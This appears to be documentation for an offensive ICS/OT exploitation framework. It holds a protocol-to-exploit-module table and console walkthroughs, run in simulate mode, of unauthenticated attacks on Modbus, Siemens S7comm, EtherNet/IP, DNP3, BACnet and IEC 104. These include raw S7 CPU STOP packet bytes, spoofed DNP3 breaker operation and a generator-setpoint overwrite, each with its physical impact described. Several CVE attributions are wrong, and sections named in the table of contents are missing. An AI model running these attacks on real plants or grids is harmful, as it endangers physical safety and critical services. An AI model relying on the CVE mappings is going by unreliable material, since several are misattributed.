# Protocols & Vendors

IXF covers 50+ industrial protocols and 150+ OT/ICS vendors worldwide with scan, check, security assessment, and exploit modules. This document provides a comprehensive reference for all supported protocols, the top-10 protocol deep dives with module examples, vendor coverage by region, and workflow guidance for discovery and adding new vendor coverage.

---

## Table of Contents

1. [Protocol Overview Table](#protocol-overview-table)
2. [Protocol Deep Dives](#protocol-deep-dives)
   - [Modbus TCP/RTU](#modbus-tcprtu)
   - [Siemens S7comm / S7comm+](#siemens-s7comm--s7comm)
   - [EtherNet/IP (CIP)](#ethernetip-cip)
   - [DNP3](#dnp3)
   - [BACnet/IP](#bacnetip)
   - [IEC 60870-5-104](#iec-60870-5-104)
   - [OPC UA](#opc-ua)
   - [IEC 61850](#iec-61850)
   - [Omron FINS](#omron-fins)
   - [PROFINET DCP](#profinet-dcp)
3. [protocols Command](#protocols-command)
4. [vendors Command](#vendors-command)
5. [Vendor Coverage by Region](#vendor-coverage-by-region)
   - [Europe](#europe)
   - [Americas](#americas)
   - [Brazil / LATAM (Special Section)](#brazil--latam-special-section)
   - [Asia-Pacific](#asia-pacific)
   - [Energy / Power Grid Specialists](#energy--power-grid-specialists)
   - [Specialized / Other](#specialized--other)
6. [Vendor Discovery Workflow](#vendor-discovery-workflow)
7. [Adding a New Vendor](#adding-a-new-vendor)

---

## Protocol Overview Table

All 50 protocols have at least one module under `exploits/protocols/` or `scanners/ics/`. The "Protocol Type" column identifies the OSI-layer role.

| Protocol | Standard / Owner | Default Port | Protocol Type | Module Path | Region / Usage | Example CVEs |
|----------|-----------------|-------------|---------------|-------------|----------------|--------------|
| **Modbus TCP** | Modicon/Schneider | 502 TCP | Application (fieldbus over TCP) | `exploits/protocols/modbus/` | Global — SCADA, PLCs, RTUs | CVE-2018-7789, CVE-2021-22763 |
| **Modbus RTU** | Modicon/Schneider | N/A (serial) | Application (serial fieldbus) | `exploits/protocols/modbus/` | Legacy serial devices, gateways | CVE-2019-6857 |
| **Modbus ASCII** | Modicon/Schneider | N/A (serial) | Application (serial fieldbus) | `exploits/protocols/modbus/` | Very legacy devices | — |
| **Siemens S7comm** | Siemens | 102 TCP | Application over ISO-TSAP | `exploits/protocols/s7comm/` | Siemens S7-200/300/400 PLCs | CVE-2019-10929, CVE-2019-13945 |
| **Siemens S7comm+** | Siemens | 102 TCP | Application over TLS | `exploits/protocols/s7comm_plus/` | Siemens S7-1200/1500 PLCs | CVE-2021-22681, CVE-2021-31894 |
| **EtherNet/IP (CIP)** | ODVA | 44818 TCP, 2222 UDP | Application over TCP/UDP | `exploits/protocols/enip/` | Rockwell, Omron, Allen-Bradley | CVE-2012-6435, CVE-2022-1161 |
| **PROFINET DCP** | PROFIBUS International | L2 Broadcast (eth) | L2 (Ethernet broadcast) | `exploits/protocols/profinet/` | Siemens, Beckhoff, WAGO, Phoenix | CVE-2017-2680, CVE-2021-37185 |
| **PROFINET RT** | PROFIBUS International | L2 Multicast | L2 Real-Time | `exploits/protocols/profinet/` | Siemens, Beckhoff | CVE-2021-37185 |
| **PROFINET IRT** | PROFIBUS International | L2 Isochronous | L2 Isochronous RT | `exploits/protocols/profinet/` | High-precision motion control | — |
| **DNP3** | IEEE 1815 | 20000 TCP/UDP | Application (SCADA) | `exploits/protocols/dnp3/` | Power grids, water, oil & gas US | CVE-2015-7976, CVE-2021-27041 |
| **BACnet/IP** | ANSI/ASHRAE 135 | 47808 UDP | Application (BAS) | `exploits/protocols/bacnet/` | Building automation worldwide | CVE-2019-12480, CVE-2022-24049 |
| **BACnet/MSTP** | ANSI/ASHRAE 135 | N/A (serial) | Application (serial BAS) | `exploits/protocols/bacnet_mstp/` | Building serial networks | CVE-2021-21842 |
| **BACnet/SC** | ANSI/ASHRAE 135-2020 | 47808 UDP/TLS | Application (secure BAS) | `exploits/protocols/bacnet_sc/` | Modern BAS (2020+) | — |
| **IEC 60870-5-104** | IEC | 2404 TCP | Application (power SCADA) | `exploits/protocols/iec104/` | Power grid RTUs, Europe/Asia | CVE-2019-18250, CVE-2021-32986 |
| **IEC 60870-5-101** | IEC | N/A (serial) | Application (serial power) | `exploits/protocols/iec101/` | Legacy power grid serial RTUs | — |
| **IEC 61850 MMS** | IEC | 102 TCP | Application (substation) | `exploits/protocols/iec61850/` | Substations, protection relays | CVE-2019-12255, CVE-2020-14511 |
| **IEC 61850 GOOSE** | IEC | L2 Multicast | L2 (protection relay) | `exploits/protocols/iec61850/` | Relay interlocking, trip signals | CVE-2019-12255 |
| **IEC 61850 SV (Sampled Values)** | IEC | L2 Multicast | L2 (metering) | `exploits/protocols/iec61850/` | Digital substation metering | — |
| **OPC UA** | OPC Foundation | 4840 TCP | Application (IIoT) | `exploits/protocols/opcua/` | Cross-platform industrial IoT | CVE-2023-27321, CVE-2021-42565 |
| **OPC DA (DCOM)** | OPC Foundation | 135 TCP | Application (Windows DCOM) | `exploits/protocols/opc_da/` | Legacy Windows SCADA | CVE-2012-0002, DCOM relay |
| **OPC HDA** | OPC Foundation | 135 TCP | Application (historical) | `exploits/protocols/opc_hda/` | Historical data access | CVE-2012-0152 |
| **OPC A&E** | OPC Foundation | 135 TCP | Application (alarms/events) | `exploits/protocols/opc_ae/` | Alarm and event management | — |
| **Omron FINS** | Omron | 9600 UDP | Application (fieldbus) | `exploits/protocols/fins/` | Omron CS/CJ/NJ/NX/CP/CV series | CVE-2022-34151, CVE-2021-27406 |
| **Unitronics PCOM** | Unitronics | 20256 TCP | Application (proprietary) | `exploits/protocols/pcom/` | Vision/Unistream PLCs | CVE-2023-6448 |
| **Beckhoff ADS/AMS** | Beckhoff | 48898 TCP | Application (TwinCAT) | `exploits/protocols/ads/` | TwinCAT runtime, Beckhoff PLCs | CVE-2019-9007, CVE-2021-3010 |
| **MQTT** | OASIS | 1883 TCP, 8883 TLS | Application (messaging) | `exploits/protocols/mqtt/` | IIoT messaging brokers | CVE-2019-11781, CVE-2021-28166 |
| **MQTT-SN** | OASIS | 1884 UDP | Application (sensor networks) | `exploits/protocols/mqtt_sn/` | Constrained IIoT devices | — |
| **SNMP v1/v2c** | IETF (RFC 1157) | 161 UDP | Application (management) | `exploits/protocols/snmp/` | Network/OT device management | CVE-2017-6742, CVE-2021-38387 |
| **SNMP v3** | IETF (RFC 3411) | 161 UDP | Application (management) | `exploits/protocols/snmp/` | Secure device management | CVE-2021-29229 |
| **PROFIBUS DP** | IEC 61158 | 1962 TCP (gateway) | Fieldbus (serial) | `exploits/protocols/profibus/` | Siemens, Beckhoff, WAGO | CVE-2016-9158 |
| **PROFIBUS PA** | IEC 61158-2 | 1962 TCP (gateway) | Fieldbus (process) | `exploits/protocols/profibus_pa/` | Process instrumentation | — |
| **HART** | HART Communication Foundation | 5094 TCP (HART-IP) | Fieldbus (instrument) | `exploits/protocols/hart/` | Field instruments (transmitters, valves) | CVE-2019-14481 |
| **WirelessHART** | IEC 62591 | 5094 UDP | Wireless fieldbus | `exploits/protocols/whart/` | Wireless instrument networks | CVE-2020-25159 |
| **CANopen** | CAN in Automation (CiA) | 4001 TCP (gateway) | Fieldbus (CAN) | `exploits/protocols/canopen/` | Machine control, automotive | CVE-2020-7524 |
| **CC-Link** | CLPA/Mitsubishi | 61450 UDP | Fieldbus (Mitsubishi) | `exploits/protocols/cc_link/` | Mitsubishi networks, Japan | CVE-2020-5550 |
| **CC-Link IE Field** | CLPA/Mitsubishi | 61450 UDP | Industrial Ethernet | `exploits/protocols/cc_link_ie_field/` | Mitsubishi advanced networks | CVE-2021-20605 |
| **CC-Link IE TSN** | CLPA/Mitsubishi | 61450 UDP | Time-Sensitive Networking | `exploits/protocols/cc_link_ie_tsn/` | Mitsubishi next-gen | — |
| **EtherCAT** | Beckhoff/ETG | L2 Ethernet | Real-Time Ethernet | `exploits/protocols/ethercat/` | Beckhoff TwinCAT, Omron | CVE-2022-32292 |
| **EtherNet/POWERLINK** | EPSG/B&R | L2 Ethernet | Real-Time Ethernet | `exploits/protocols/powerlink/` | B&R, Keba, Baumüller | CVE-2020-12529 |
| **SERCOS III** | Sercos International | 8008 TCP | Real-Time Ethernet | `exploits/protocols/sercos/` | CNC and robotics motion control | — |
| **IO-Link** | IO-Link Community | — (point-to-point) | Smart sensor interface | `exploits/protocols/iolink/` | Smart sensors and actuators | CVE-2021-37183 |
| **INTERBUS** | Phoenix Contact | 1962 TCP (gateway) | Serial fieldbus | `exploits/protocols/interbus/` | Phoenix Contact systems | — |
| **ControlNet** | Rockwell/ODVA | 44818 TCP | Real-Time Network | `exploits/protocols/controlnet/` | Rockwell legacy (1756-CNB) | CVE-2012-6433 |
| **DeviceNet** | ODVA | 44818 TCP (gateway) | CAN-based fieldbus | `exploits/protocols/devicenet/` | Rockwell, Allen-Bradley CAN | CVE-2012-6435 |
| **PCCC** | Allen-Bradley (Rockwell) | 44818 TCP | Application (legacy) | `exploits/protocols/pccc/` | SLC-500, PLC-5, MicroLogix | CVE-2012-6436 |
| **FL-NET (OPCN-2)** | JEMA | 7000 UDP | Industrial Ethernet (Japan) | `exploits/protocols/fl_net/` | Fuji Electric, JTEKT, Yokogawa | CVE-2020-8957 |
| **CompoNet** | Omron/ODVA | 9600 TCP (gateway) | Serial/fieldbus (Omron) | `exploits/protocols/componet/` | Omron distributed I/O | — |
| **Yokogawa Vnet/IP** | Yokogawa | 20111 TCP | Application (DCS) | `exploits/protocols/vnetip/` | Yokogawa CENTUM VP DCS | CVE-2020-5523 |
| **FOUNDATION Fieldbus H1** | Fieldcomm Group | 1089 TCP (HSE) | Fieldbus (process) | `exploits/protocols/foundation_fieldbus/` | Emerson, ABB, Honeywell | CVE-2018-13812 |
| **FOUNDATION Fieldbus HSE** | Fieldcomm Group | 1089 TCP | High-Speed Ethernet FF | `exploits/protocols/foundation_fieldbus/` | FF high-speed backbone | CVE-2018-13813 |
| **LonWorks/LonTalk** | Echelon/Adesto | 1628 UDP | Building automation | `exploits/protocols/lonworks/` | Building automation (US) | CVE-2020-7580 |
| **KNX/EIB** | KNX Association | 3671 UDP | Building automation | `exploits/protocols/knx/` | Building automation (Europe) | CVE-2021-37732 |
| **CIP Safety** | ODVA | 44818 TCP | Safety fieldbus (CIP) | `exploits/protocols/ethernet_ip_cip_safety/` | Rockwell GuardLogix, safety I/O | CVE-2022-1364 |
| **PROFIsafe** | PROFIBUS International | On PROFINET | Safety fieldbus (PROFINET) | `exploits/protocols/profisafe/` | Siemens safety systems | CVE-2020-13561 |
| **FSoE (Fail-Safe over EtherCAT)** | ETG | L2 Ethernet | Safety fieldbus (EtherCAT) | `exploits/protocols/fsoe/` | Beckhoff TwinSAFE | CVE-2022-32292 |
| **SECS/GEM (HSMS)** | SEMI | 5000 TCP | Semiconductor equipment | `exploits/protocols/hsms/` | Semiconductor fab tools (ASML, KLA) | CVE-2019-10945 |
| **Serial-to-Ethernet (Raw TCP)** | Various | 4001 TCP | Serial tunnel | `exploits/protocols/serial/` | Moxa NPort, Lantronix, Digi | CVE-2019-12255, CVE-2021-4106 |

---

## Protocol Deep Dives

### Modbus TCP/RTU

**Overview:**
Modbus is the oldest and most widely deployed industrial protocol, published by Modicon in 1979. It has no authentication, no encryption, and no access control by design. Any host that can reach port 502 can read and write all registers, including process setpoints, safety flags, and operational data. IXF has more Modbus modules than any other protocol.

**Protocol Characteristics:**
- Master-slave (client-server) architecture
- Function codes 01–127 define read/write operations
- Holding Registers (HR, 40001–49999): 16-bit read/write values
- Coils (00001–09999): 1-bit read/write outputs
- Discrete Inputs (10001–19999): 1-bit read-only inputs
- Input Registers (30001–39999): 16-bit read-only values
- No session state, no authentication, no TLS (standard Modbus)

**CVEs in IXF:**
- CVE-2018-7789: Schneider Modicon M340 authentication bypass via Modbus
- CVE-2019-6857: Schneider Electric service crash via malformed Modbus request
- CVE-2021-22763: EcoStruxure auth bypass via Modbus function code abuse
- CVE-2018-7847: Schneider Modicon Quantum arbitrary code execution via Modbus

**Example Modules:**

```
exploits/protocols/modbus/modbus_read_all_registers
exploits/protocols/modbus/modbus_write_holding_register
exploits/protocols/modbus/modbus_write_multiple_registers
exploits/protocols/modbus/modbus_broadcast_flood
exploits/protocols/modbus/modbus_coil_flip
exploits/protocols/modbus/modbus_rogue_master
exploits/protocols/modbus/modbus_read_intercept
exploits/protocols/modbus/modbus_report_spoof
exploits/protocols/modbus/modbus_device_id
exploits/protocols/modbus/modbus_io_brute_force
exploits/protocols/modbus/modbus_logger
exploits/protocols/modbus/modbus_coil_register_map
exploits/protocols/modbus/modbus_alarm_setpoint_write
exploits/protocols/modbus/modbus_write_alarm_suppression_coil
scanners/ics/modbus_scanner
```

**Module Usage — Read All Registers:**

```
ixf > use exploits/protocols/modbus/modbus_read_all_registers
ixf [modbus_read_all_registers] > show options

  Module: exploits/protocols/modbus/modbus_read_all_registers
  Protocol: Modbus TCP (RFC 1628)
  MITRE: T0802 (Automated Collection), T0801 (Monitor Process State)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       Target IP address
  port           502          no        Modbus TCP port
  unit_id        1            no        Modbus unit/slave ID (1-247)
  start_reg      0            no        Starting register address
  count          125          no        Number of registers to read
  timeout        5            no        Connection timeout (seconds)
  ──────────────────────────────────────────────────────────────────

ixf [modbus_read_all_registers] > set target 192.168.1.50
ixf [modbus_read_all_registers] > set unit_id 1
ixf [modbus_read_all_registers] > run

  [SIMULATE] Modbus TCP Read Holding Registers (FC03)
  Target: 192.168.1.50:502, Unit ID: 1
  Would read HR[0–124] (125 registers)

  Simulated response:
  HR[000]: 0x0064  (100)   — possible temperature setpoint (°C)
  HR[001]: 0x01F4  (500)   — possible pressure setpoint (mbar)
  HR[002]: 0x00C8  (200)   — possible flow rate setpoint (L/min)
  HR[003]: 0x0000  (0)     — unknown
  HR[004]: 0x0001  (1)     — possible mode selector
  HR[005]: 0x0190  (400)   — possible speed setpoint (RPM)
  ...
  [+] Simulate complete: 125 registers would be read in 1 request
```

**Module Usage — Write Holding Register:**

```
ixf > use exploits/protocols/modbus/modbus_write_holding_register
ixf [modbus_write_holding_register] > set target 192.168.1.50
ixf [modbus_write_holding_register] > set register 5
ixf [modbus_write_holding_register] > set value 400
ixf [modbus_write_holding_register] > run

  [SIMULATE] Modbus TCP Write Single Register (FC06)
  Target: 192.168.1.50:502, Unit ID: 1
  Would write HR[5] = 400 (0x0190)
  Packet: 00 01 00 00 00 06 01 06 00 05 01 90
  MITRE: T0836 (Modify Parameter)
  Physical risk: Process setpoint modified without authorization
```

---

### Siemens S7comm / S7comm+

**Overview:**
S7comm is Siemens' proprietary protocol for communicating with S7-300/400 PLCs over ISO-TSAP (port 102). S7comm+ is the TLS-secured variant used by S7-1200/S7-1500. Both carry no authentication by default in factory configuration. S7comm was famously exploited by Stuxnet and is the most extensively documented ICS protocol attack surface.

**Protocol Characteristics:**
- Runs over ISO-TSAP (RFC 1006) on TCP port 102
- PDU types: 1 (job), 2 (ack), 3 (ack-data), 7 (user-data)
- Operations: read/write data blocks (DB), control CPU (STOP/START/RESET)
- S7comm+: same port 102, but uses TLS with hardcoded certificate (CVE-2021-22681)
- Data types: DB (Data Block), OB (Organization Block), FC (Function), FB (Function Block)

**CVEs in IXF:**
- CVE-2019-10929: S7comm invalid COTP TPDU triggers denial of service
- CVE-2019-13945: SCALANCE X unauthenticated program download path
- CVE-2021-22681: S7-1200/1500 hardcoded TLS cryptographic key in firmware
- CVE-2021-31894: S7-1500 remote code execution via crafted S7comm+ packet
- CVE-2022-38773: S7-1200/1500 path traversal in web server component
- CVE-2022-43767: WinCC path traversal enabling remote code execution

**Example Modules:**

```
exploits/protocols/s7comm/s7_plc_program_upload_download
exploits/protocols/s7comm/s7_cpu_stop_command
exploits/protocols/s7comm/s7_read_szl_list
exploits/protocols/s7comm/s7_write_db_block
exploits/protocols/s7comm/s7_read_system_info
exploits/protocols/s7comm/s7_change_plc_password
exploits/protocols/s7comm/s7_ob1_inject
exploits/protocols/s7comm/s7_firmware_update_mode
exploits/protocols/s7comm/s7_force_program_state
exploits/protocols/s7comm/s7_io_image_read
exploits/protocols/s7comm/s7_native_api_call
exploits/protocols/s7comm/s7_read_cpu_mode
exploits/protocols/s7comm/s7_db_exfil
scanners/ics/s7_comm_scanner
cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
cve/siemens/cve_2021_31894_s7_1500_rce
```

**Module Usage — CPU Stop Command:**

```
ixf > use exploits/protocols/s7comm/s7_cpu_stop_command
ixf [s7_cpu_stop_command] > show options

  Module: exploits/protocols/s7comm/s7_cpu_stop_command
  Protocol: S7comm (Siemens proprietary, ISO-TSAP/TCP:102)
  MITRE: T0816 (Device Restart/Shutdown), T0813 (Denial of Control)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       Target PLC IP address
  port           102          no        S7comm port (default 102)
  rack           0            no        PLC rack number
  slot           1            no        PLC slot number (usually 1 or 2)
  timeout        5            no        Connection timeout
  ──────────────────────────────────────────────────────────────────

ixf [s7_cpu_stop_command] > set target 192.168.1.100
ixf [s7_cpu_stop_command] > set slot 1
ixf [s7_cpu_stop_command] > run

  [SIMULATE] S7comm CPU STOP Command
  Target: 192.168.1.100:102 (rack=0, slot=1)

  Would send S7comm PDU sequence:
  1. COTP Connection Request (TPDU type 0xE0)
  2. S7comm Setup Communication (PDU type 0x01, FC 0xF0)
  3. S7comm Stop CPU Request (PDU type 0x01, FC 0x29)
     Payload: 03 00 00 1D 02 F0 80 32 01 00 00 00 00 00 10 00
              00 29 00 00 00 00 FD 00 00 09 50 5F 50 52 4F 47
              52 41 4D

  Physical impact:
  - PLC CPU transitions from RUN to STOP state
  - All PLC outputs de-energize (or go to last-value depending on config)
  - Process control lost for 30–120 seconds (manual restart required)
  - MITRE: T0816 (Device Restart), T0813 (Denial of Control)

  [+] Simulate complete — 0 packets sent
```

**Module Usage — Read SZL List (System Status List):**

```
ixf > use exploits/protocols/s7comm/s7_read_szl_list
ixf [s7_read_szl_list] > set target 192.168.1.100
ixf [s7_read_szl_list] > run

  [SIMULATE] S7comm SZL Read (System Status List)
  MITRE: T0888 (Remote System Information Discovery), T0877 (I/O Module Discovery)

  Would read SZL IDs:
  - SZL 0x0131: Module catalog information (CPU type, firmware version)
  - SZL 0x0132: Module state list (I/O rack configuration)
  - SZL 0x0091: DP master configuration
  - SZL 0x0111: Signal module catalog

  Simulated response (SZL 0x0131):
  CPU Type:           S7-1515-2 PN
  Order number:       6ES7 515-2AM02-0AB0
  Firmware version:   V2.9.4
  MPI address:        2
  Interfaces:         2x PROFINET, 1x MPI
```

---

### EtherNet/IP (CIP)

**Overview:**
EtherNet/IP (Common Industrial Protocol over Ethernet) is developed by ODVA and used primarily by Rockwell Automation (Allen-Bradley), Omron, and other vendors. It runs CIP over TCP (port 44818) for explicit messaging and UDP (port 2222) for implicit (I/O) messaging. It is the dominant protocol in North American manufacturing.

**Protocol Characteristics:**
- TCP 44818: Explicit messaging (programming, configuration, diagnostics)
- UDP 2222: Implicit I/O messaging (real-time data exchange)
- CIP services: Get Attribute Single, Set Attribute Single, Forward Open (I/O connection)
- Objects: Identity Object (0x01), Assembly Object (0x04), Connection Manager (0x06)
- No native authentication on older firmware — newer (ControlLogix 2.x+) supports Level 1-3 security
- CIP Safety: additional safety-certified layer for GuardLogix

**CVEs in IXF:**
- CVE-2012-6435: EtherNet/IP authentication bypass (original ODVA implementation)
- CVE-2022-1161: Rockwell ControlLogix modified ladder logic download
- CVE-2021-27478: Rockwell FactoryTalk remote code execution via EtherNet/IP
- CVE-2012-6433: ControlNet buffer overflow via malformed EtherNet/IP packet
- CVE-2021-22681 (Siemens S7+): Related CIP authentication bypass pattern

**Example Modules:**

```
exploits/protocols/enip/enip_list_identity
exploits/protocols/enip/enip_get_attribute_all
exploits/protocols/enip/enip_forward_open_flood
exploits/protocols/enip/enip_reset_identity
exploits/protocols/enip/enip_program_download_controllogix
exploits/protocols/enip/enip_program_upload
exploits/protocols/enip/enip_write_tag
exploits/protocols/enip/enip_cip_native_api
exploits/protocols/enip/enip_run_stop_control
exploits/protocols/enip/enip_list_services
scanners/ics/enip_scanner
```

**Module Usage — List Identity (Discovery):**

```
ixf > use exploits/protocols/enip/enip_list_identity
ixf [enip_list_identity] > show options

  Module: exploits/protocols/enip/enip_list_identity
  Protocol: EtherNet/IP (CIP) — Identity Object 0x01
  MITRE: T0846 (Remote System Discovery), T0888 (Remote System Info Discovery)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       Target IP or subnet (CIDR)
  port           44818        no        EtherNet/IP TCP port
  timeout        3            no        Per-host timeout (seconds)
  ──────────────────────────────────────────────────────────────────

ixf [enip_list_identity] > set target 192.168.1.30
ixf [enip_list_identity] > run

  [SIMULATE] EtherNet/IP List Identity Request
  Target: 192.168.1.30:44818

  Simulated Identity Object response:
  Vendor ID:        1 (Rockwell Automation)
  Device Type:      14 (Programmable Logic Controller)
  Product Code:     166 (1756-L85E)
  Revision:         32.011
  Serial Number:    0xBEEFCAFE
  Product Name:     "1756-L85E/A LOGIX5585"
  IP Address:       192.168.1.30
  Status:           Running (0x0060)
```

**Module Usage — Write Tag (T0836):**

```
ixf > use exploits/protocols/enip/enip_write_tag
ixf [enip_write_tag] > set target 192.168.1.30
ixf [enip_write_tag] > set tag_name "PressureSetpoint"
ixf [enip_write_tag] > set value 9999.0
ixf [enip_write_tag] > run

  [SIMULATE] EtherNet/IP CIP Write Tag
  Target: 192.168.1.30:44818
  Tag: PressureSetpoint = 9999.0 (REAL type)
  MITRE: T0836 (Modify Parameter)

  Would open CIP connection and send:
  Service: 0x4D (Write Tag)
  Path: (symbolic segment) "PressureSetpoint"
  Data type: 0xCA (REAL, 4 bytes)
  Data: 0x4617C280 (9999.0 in IEEE 754)
```

---

### DNP3

**Overview:**
DNP3 (Distributed Network Protocol 3) is the dominant protocol for power grid, water, and oil & gas SCADA systems in North America. It was designed for noisy serial environments and later adapted for TCP/IP. DNP3 lacks authentication by default (Secure Authentication version 5 / SAv5 is optional and rarely deployed in practice).

**Protocol Characteristics:**
- TCP/UDP port 20000 (standard), serial RS-232/485 in legacy deployments
- Master-outstation (client-server) architecture
- Data Link, Transport, Application layers (independent of IP)
- Function codes: Read (1), Write (2), Direct Operate (3, 4), Direct Operate No Ack (5)
- Object groups: Analog Input (30), Analog Output (40), Binary Input (1), Binary Output (10)
- DNP3 SAv5 (IEEE 1815-2012): HMAC-based authentication, rarely deployed

**CVEs in IXF:**
- CVE-2015-7976: DNP3 denial of service via malformed packet
- CVE-2021-27041: DNP3 unsolicited response abuse — false data injection
- CVE-2019-18250: Triangle MicroWorks DNP3 buffer overflow

**Example Modules:**

```
exploits/protocols/dnp3/dnp3_direct_operate
exploits/protocols/dnp3/dnp3_direct_operate_unauth
exploits/protocols/dnp3/dnp3_unsolicited_response_disable
exploits/protocols/dnp3/dnp3_warm_restart
exploits/protocols/dnp3/dnp3_cold_restart
exploits/protocols/dnp3/dnp3_data_link_scan
exploits/protocols/dnp3/dnp3_rogue_master
exploits/protocols/dnp3/dnp3_response_spoof
exploits/protocols/dnp3/dnp3_data_poller
exploits/protocols/dnp3/dnp3_control_block
exploits/protocols/dnp3/dnp3_response_drop
scanners/ics/dnp3_data_link_scan
```

**Module Usage — Direct Operate (Control Output):**

```
ixf > use exploits/protocols/dnp3/dnp3_direct_operate
ixf [dnp3_direct_operate] > show options

  Module: exploits/protocols/dnp3/dnp3_direct_operate
  Protocol: DNP3 (IEEE 1815) over TCP:20000
  MITRE: T0855 (Unauthorized Command Message), T0831 (Manipulation of Control)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       Target IP address (master/RTU)
  port           20000        no        DNP3 TCP port
  outstation_addr  1          no        DNP3 outstation address
  master_addr    2            no        DNP3 master address (spoofed)
  object_group   12           no        Object group (12=CROB, 40=Analog)
  object_index   0            no        Point index to control
  control_code   3            no        CROB code: 3=PULSE_ON, 4=LATCH_ON
  ──────────────────────────────────────────────────────────────────

ixf [dnp3_direct_operate] > set target 192.168.1.80
ixf [dnp3_direct_operate] > set outstation_addr 1
ixf [dnp3_direct_operate] > set object_index 5
ixf [dnp3_direct_operate] > set control_code 4
ixf [dnp3_direct_operate] > run

  [SIMULATE] DNP3 Direct Operate — Binary Output (Breaker/Switch Control)
  Target: 192.168.1.80:20000 | Outstation: 1 | Master: 2 (spoofed)
  Object: Group 12 (CROB), Index 5, Control Code: 0x04 (LATCH_ON)
  MITRE: T0855 (Unauthorized Command)

  Physical meaning: If index 5 maps to a circuit breaker:
  LATCH_ON = Close the breaker (energize the circuit)
  An attacker can open/close breakers, causing load shedding or
  reconnection of faulted equipment.
```

---

### BACnet/IP

**Overview:**
BACnet (Building Automation and Control Networks) is the primary protocol for HVAC, lighting, fire suppression, and access control systems. BACnet/IP uses UDP broadcast on port 47808. Like Modbus, it has no authentication or encryption in the base standard (BACnet/SC adds security in ASHRAE 135-2020).

**Protocol Characteristics:**
- UDP 47808 (0xBAC0): BACnet Virtual Link Layer (BVLL)
- Services: Who-Is, I-Am (discovery); Read Property, Write Property (read/write)
- Object types: Analog Input/Output/Value, Binary Input/Output/Value, Schedule, Calendar
- No authentication in base standard — BACnet/SC (Secure Connect) optional since 2020
- Broadcast-based discovery: any BACnet device on the subnet responds to Who-Is

**CVEs in IXF:**
- CVE-2019-12480: Distech Controls ECLYPSE BACnet controller path traversal
- CVE-2022-24049: Delta Controls ORCAview BACnet server command injection
- CVE-2021-21842: BACnet International bacnet-stack buffer overflow

**Module Usage — Who-Is Discovery:**

```
ixf > use exploits/protocols/bacnet/bacnet_who_is
ixf [bacnet_who_is] > show options

  Module: exploits/protocols/bacnet/bacnet_who_is
  Protocol: BACnet/IP (ASHRAE 135) — UDP:47808
  MITRE: T0846 (Remote System Discovery), T0888

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target         broadcast    no        Target or subnet broadcast
  port           47808        no        BACnet port
  timeout        5            no        Wait time for I-Am responses (s)
  ──────────────────────────────────────────────────────────────────

ixf [bacnet_who_is] > set target 192.168.1.255
ixf [bacnet_who_is] > run

  [SIMULATE] BACnet/IP Who-Is Broadcast
  Target: 192.168.1.255:47808 (subnet broadcast)

  Would send BACnet Who-Is request (all devices, no range filter)
  Packet: 81 0B 00 0C 01 20 FF FF 00 FF 10 08

  Simulated responses:
  192.168.1.110 — I-Am: Device 1001, Vendor: Johnson Controls (5), Model: Facility Explorer
  192.168.1.111 — I-Am: Device 1002, Vendor: Honeywell (7), Model: Spyder BAS Controller
  192.168.1.112 — I-Am: Device 2001, Vendor: Siemens (4), Model: DESIGO CC
  192.168.1.113 — I-Am: Device 3001, Vendor: Distech Controls (29), Model: ECLYPSE ECY-S30
```

**Module Usage — Write Property (T0836):**

```
ixf > use exploits/protocols/bacnet/bacnet_write_property
ixf [bacnet_write_property] > set target 192.168.1.110
ixf [bacnet_write_property] > set device_id 1001
ixf [bacnet_write_property] > set object_type 1
ixf [bacnet_write_property] > set object_instance 3
ixf [bacnet_write_property] > set property 85
ixf [bacnet_write_property] > set value 28.0
ixf [bacnet_write_property] > run

  [SIMULATE] BACnet Write Property
  Object: Analog Output 3, Property: Present Value (85), Value: 28.0
  MITRE: T0836 (Modify Parameter)

  If AO-3 maps to chiller setpoint:
  Writing 28.0°C (vs 7.0°C design setpoint) causes chiller to stop cooling
  Physical impact: Data center/office temperature rises uncontrolled
```

---

### IEC 60870-5-104

**Overview:**
IEC 104 is the TCP/IP adaptation of IEC 60870-5-101 (serial), widely used by European and Asian power utilities for SCADA communication with RTUs and protection relays. It carries Application Protocol Data Units (APDUs) for measurement data and control commands.

**Protocol Characteristics:**
- TCP port 2404 (default)
- APDU types: I-frame (information), S-frame (supervisory), U-frame (unnumbered)
- ASDUs (Application Service Data Units): contain process data, control commands, time sync
- Common Address of ASDU (CA): identifies the RTU/station
- Information Object Address (IOA): identifies the specific measurement or output point
- No encryption or authentication in base standard (IEC 62351 adds security, rarely deployed)

**CVEs in IXF:**
- CVE-2019-18250: Triangle MicroWorks buffer overflow in IEC 104 parser
- CVE-2021-32986: eWON Flexy IEC 104 gateway denial of service

**Module Usage — Setpoint Control (T0855):**

```
ixf > use exploits/protocols/iec104/iec104_setpoint_no_auth
ixf [iec104_setpoint_no_auth] > show options

  Module: exploits/protocols/iec104/iec104_setpoint_no_auth
  Protocol: IEC 60870-5-104 (IEC) — TCP:2404
  MITRE: T0855 (Unauthorized Command), T0836 (Modify Parameter)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       RTU/SCADA server IP
  port           2404         no        IEC 104 port
  ca             1            no        Common Address of ASDU
  ioa            100          no        Information Object Address
  value          0.0          no        Setpoint value (float/int)
  type_id        50           no        ASDU type: 50=short float setpoint
  ──────────────────────────────────────────────────────────────────

ixf [iec104_setpoint_no_auth] > set target 192.168.10.5
ixf [iec104_setpoint_no_auth] > set ca 1
ixf [iec104_setpoint_no_auth] > set ioa 100
ixf [iec104_setpoint_no_auth] > set value 440.0
ixf [iec104_setpoint_no_auth] > run

  [SIMULATE] IEC 104 Setpoint Command — Unauthenticated
  RTU: 192.168.10.5:2404, CA=1, IOA=100, Value=440.0
  ASDU type: 0x32 (50 — Short Float Setpoint with Execute)
  MITRE: T0855 (Unauthorized Command)

  If IOA=100 maps to a generator active power setpoint:
  Writing 440 MW to a 250 MW generator causes governor runaway
  Physical impact: Over-frequency trip, generation loss, cascade failure risk
```

